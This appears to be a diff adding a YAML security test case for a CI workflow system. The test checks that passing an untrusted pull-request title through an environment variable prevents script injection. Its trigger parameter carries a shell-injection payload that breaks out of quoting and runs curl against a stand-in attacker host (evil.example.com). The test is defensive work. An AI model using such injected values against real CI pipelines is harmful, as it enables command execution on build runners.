@@ -1,0 +1,49 @@
+id: SEC-INJECT-03-006
+dimensions: [security]
+dimension: security
+priority: P1
+title: "通过环境变量安全引用不可信输入应不触发脚本注入"
+intent_ref: INTENT-SEC-013
+
+setup:
+  repo_fixture: with-fork-and-pr-template
+  secrets: []
+  variables: {}
+  branch_protection: default
+
+workflow: |
+  on: [pull_request]
+  jobs:
+    safe-ref:
+      name: (SEC-INJECT-03-006) 验证 env 安全引用模式
+      runs-on: [ubuntu-latest, x64, small]
+      steps:
+        - name: (SEC-INJECT-03-006) 检出代码
+          uses: checkout
+        - name: (SEC-INJECT-03-006) 通过 env 中间变量安全引用 PR 标题
+          run: |
+            echo "SAFE_TITLE: ${SAFE_PR_TITLE}"
+            echo "INJECT_MARKER: no_command_executed"
+          env:
+            SAFE_PR_TITLE: ${{ atomgit.event.pull_request.title }}
+
+trigger:
+  event: pull_request
+  as: untrusted_contributor
+  params:
+    pr_title: "safe'; curl -s http://evil.example.com/pwned; echo 'done"
+
+fault_injection: null
+
+assertions:
+  - type: positive
+    target: step_logs
+    eval: deterministic
+    rubric: "env 中间变量方式引用的含元字符 PR 标题不触发命令执行"
+  - type: negative
+    target: step_logs
+    eval: deterministic
+    rubric: "日志中不出现 curl 等注入命令的执行痕迹"
+
+teardown:
+  reset: fixture
